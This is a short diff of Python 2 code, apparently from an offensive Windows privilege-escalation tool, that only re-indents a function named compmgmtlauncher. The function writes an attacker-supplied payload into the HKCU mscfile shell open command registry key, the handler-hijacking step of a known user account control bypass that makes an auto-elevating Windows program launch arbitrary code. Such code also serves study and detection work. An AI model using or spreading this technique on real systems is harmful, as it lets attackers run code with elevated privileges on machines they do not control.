@@ -30,13 +30,13 @@ def compmgmtlauncher():
 	print " {} compmgmtlauncher: Attempting to create registry key".format(infoBox())
 	try:
 		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
-								os.path.join("Software\Classes\mscfile\shell\open\command"))
+					os.path.join("Software\Classes\mscfile\shell\open\command"))
 								
 		_winreg.SetValueEx(key,
-							None,
-							0,
-							_winreg.REG_SZ,
-							payload)
+				None,
+				0,
+				_winreg.REG_SZ,
+				payload)
 		_winreg.CloseKey(key)
 		print " {} compmgmtlauncher: Registry key created".format(successBox())
 	except Exception as error:
